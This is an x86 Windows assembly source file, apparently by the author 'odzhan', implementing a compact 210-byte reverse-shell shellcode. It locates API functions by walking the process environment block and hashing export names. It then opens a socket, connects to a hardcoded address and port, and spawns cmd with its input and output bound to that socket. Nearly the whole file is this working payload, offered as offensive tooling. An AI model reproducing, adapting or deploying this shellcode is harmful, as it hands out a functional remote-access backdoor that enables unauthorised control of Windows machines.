;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 210 byte reverse shell for x86 windows
; odzhan
    bits   32

struc pushad_t
  _edi resd 1
  _esi resd 1
  _ebp resd 1
  _esp resd 1
  _ebx resd 1
  _edx resd 1
  _ecx resd 1
  _eax resd 1
  .size:
endstruc

      bits   32

      xor    eax, eax
      call   init_api_disp  ; load the API dispatcher
api_hash:      
      dd     0xDF6D65D1     ; WS2_32.dll   + WSASocketA    
      db     'cmd',0h    
      dd     0D2040002h     ; sa.sin_port = htons(1234)
      dd     00100007Fh     ; sa.sin_addr = inet_addr("127.0.0.1")
      dd     0xA324AC0C     ; WS2_32.dll   + connect
      dd     0x611AD39B     ; KERNEL32.dll + CreateProcessA
      dd     0x607F058C     ; KERNEL32.dll + WaitForSingleObject
      ;dd     0x467EDD8B     ; ntdll.dll    + RtlExitUserThread
api_disp: 
      lodsd                 ; eax = hash to find
      pushad                ; saves api hash on stack
      xor    eax, eax
      mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
      mov    eax, [eax+0ch] ; eax = (PPEB_LDR_DATA)peb->Ldr
      mov    edi, [eax+0ch] ; edi = ldr->InLoadOrderModuleList.Flink
      jmp    get_dll
next_dll:    
      mov    edi, [edi]     ; edi = dte->InLoadOrderLinks.Flink
get_dll:
      mov    ebx, [edi+18h] ; ebx = dte->DllBase
      ; eax = IMAGE_DOS_HEADER.e_lfanew
      mov    eax, [ebx+3ch]
      ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
      mov    ecx, [ebx+eax+78h]
      jecxz  next_dll
      ; esi = IMAGE_EXPORT_DIRECTORY.Name
      mov    esi, [ebx+ecx+0ch]
      add    esi, ebx
      xor    eax, eax
      cdq
hash_dll:
      lodsb
      add    edx, eax ;  h += *s++
      rol    edx, 13  ;  h = ROTL32(h, 13) 
      dec    eax
      jns    hash_dll
      mov    ebp, edx
      
      ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
      lea    esi, [ebx+ecx+18h]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll        ; skip if no names
      push   edi             ; save edi
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
      lodsd
      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
      push   eax             ; save address of functions
      ; edi = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
      xchg   eax, edi        ; swap(eax, edi)
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      add    eax, ebx        ; eax = RVA(eax, ebx)
      push   eax             ; save address of name ordinals
get_name:
      mov    esi, [edi+4*ecx-4] ; esi = RVA of API string
      add    esi, ebx           ; esi = RVA2VA(esi, ebx)
      xor    eax, eax           ; zero eax
      cdq                       ; h = 0
hash_name:    
      lodsb
      add    edx, eax
      rol    edx, 13
      dec    eax
      jns    hash_name
      add    edx, ebp           ; add hash of DLL string  
      cmp    edx, [esp+_eax+12] ; hashes match?
      loopne get_name           ; --ecx && edx != hash
      pop    edx                ; edx = AddressOfNameOrdinals
      pop    esi                ; esi = AddressOfFunctions
      pop    edi                ; restore DLL entry
      jne    next_dll           ; get next DLL        
      movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
      add    ebx, [esi+4*eax] ; ecx = base + AddressOfFunctions[eax]
      mov    [esp+_eax], ebx
      popad                        ; restore all
      jmp    eax                   ; jmp to api address
    
init_api_disp:        
      pop    esi                   ; esi = api parameters
      lea    ebp, [esi+(api_disp - api_hash)]
      
      ; edi = alloc(124);    
      push   124
      pop    ecx
      sub    esp, ecx
      mov    edi, esp
      rep    stosb

      ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
      push   1
      push   2
      call   ebp

      ; CreateProcess(NULL, "cmd", NULL, NULL, 
      ;   TRUE, 0, NULL, NULL, &si, &pi);
      mov    ebx, esp       ; ebx = &si
      lea    edi, [ebx+38h] ; edi = &si.hStdInput
      inc    dword[ebx+2dh] ; si.dwFlags = STARTF_USESTDHANDLES
      stosd                 ; si.hStdInput  = s;
      stosd                 ; si.hStdOutput = s;
      stosd                 ; si.hStdError  = s;
      cdq      
      push   edi            ; lpProcessInformation = &pi
      push   ebx            ; lpStartupInfo        = &si      
      push   edx            ; lpCurrentDirectory   = NULL
      push   edx            ; lpEnvironment        = NULL
      push   edx            ; dwCreationFlags      = 0
      push   eax            ; bInheritHandles      = TRUE
      push   edx            ; lpThreadAttributes   = NULL
      push   edx            ; lpProcessAttributes  = NULL
      push   esi            ; lpCommandLine        = "cmd", 0
      push   edx            ; lpApplicationName    = NULL
      xchg   ebx, eax
      lodsd
      ; connect(s, &sa, sizeof(sa));
      push   10h            ; sizeof(sa)
      push   esi            ; &sa
      push   ebx            ; s
      lodsd                 ; skip &sa
      lodsd
      call   ebp            ; connect
      call   ebp            ; CreateProcessA

      ; WaitForSingleObject(pi.hProcess, INFINITE);
      push   -1
      push   dword [edi]
      call   ebp   
      
      ; RtlExitUserThread();
      ; call   ebp